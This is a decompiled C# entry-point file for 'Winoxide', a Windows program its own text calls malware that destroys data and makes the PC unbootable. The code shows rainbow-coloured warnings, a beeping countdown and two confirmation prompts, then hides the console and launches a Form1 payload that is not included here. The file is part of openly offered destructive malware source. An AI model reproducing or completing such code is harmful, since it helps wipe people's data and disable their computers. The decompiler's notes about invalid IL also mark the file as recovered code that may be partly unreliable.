using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Winoxide;

internal static class Program
{
	private const int SW_HIDE = 0;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("kernel32.dll")]
	private static extern bool FreeConsole();

	[STAThread]
	private static void Main()
	{
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Invalid comparison between Unknown and I4
		RainbowWrite("YOU ARE ABOUT TO RUN A MALWARE.");
		RainbowWrite("use this malware wisely THIS WILL CAUSE DATA LOSS AND MAKES YOUR PC LIKELY UNBOOTABLE.");
		ColorWrite("if you dont know what this malware does click no to make your pc safe.", ConsoleColor.Yellow);
		ColorWrite("You sure you want to run this?", ConsoleColor.Red);
		ColorWrite("YOU WILL LOSE EVERYTHING IF YOU IGNORE THIS WARNING.", ConsoleColor.Red);
		for (int num = 15; num >= 0; num--)
		{
			Console.Write("\rYou have " + num + " seconds to read the warning to proceed...");
			Console.Beep(800, 120);
			Thread.Sleep(880);
		}
		Console.WriteLine();
		Console.Write("choose wisely or type anything to cancel... (yes/no): ");
		string text = Console.ReadLine().ToLower();
		if (text != "yes")
		{
			return;
		}
		DialogResult val = MessageBox.Show("THIS IS THE FINAL WARING \n\r\n keep in mind your pc will be destroyed. click yes kills your pc. \n\r\n YOU WONT BE ABLE TO USE WINDOWS AGAIN. \n\r\n are you sure you want to run this? \n\r\n YOULL LOSE YOUR DATA AND KILLS YOUR PC!!!", "FINAL WARNING.", (MessageBoxButtons)4, (MessageBoxIcon)48);
		if ((int)val == 6)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				FreeConsole();
				IntPtr consoleWindow = GetConsoleWindow();
				ShowWindow(consoleWindow, 0);
				Application.EnableVisualStyles();
				Application.Run((Form)(object)new Form1());
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
		}
	}

	private static void RainbowWrite(string s)
	{
		ConsoleColor[] array = new ConsoleColor[11]
		{
			ConsoleColor.Red,
			ConsoleColor.Yellow,
			ConsoleColor.Green,
			ConsoleColor.Cyan,
			ConsoleColor.Blue,
			ConsoleColor.Magenta,
			ConsoleColor.DarkYellow,
			ConsoleColor.DarkGreen,
			ConsoleColor.DarkCyan,
			ConsoleColor.DarkBlue,
			ConsoleColor.DarkMagenta
		};
		int num = 0;
		foreach (char value in s)
		{
			Console.ForegroundColor = array[num % array.Length];
			Console.Write(value);
			Console.Beep(600, 20);
			Thread.Sleep(30);
			num++;
		}
		Console.ResetColor();
		Console.WriteLine();
	}

	private static void ColorWrite(string s, ConsoleColor col)
	{
		Console.ForegroundColor = col;
		foreach (char value in s)
		{
			Console.Write(value);
			Console.Beep(600, 20);
			Thread.Sleep(30);
		}
		Console.ResetColor();
		Console.WriteLine();
	}
}
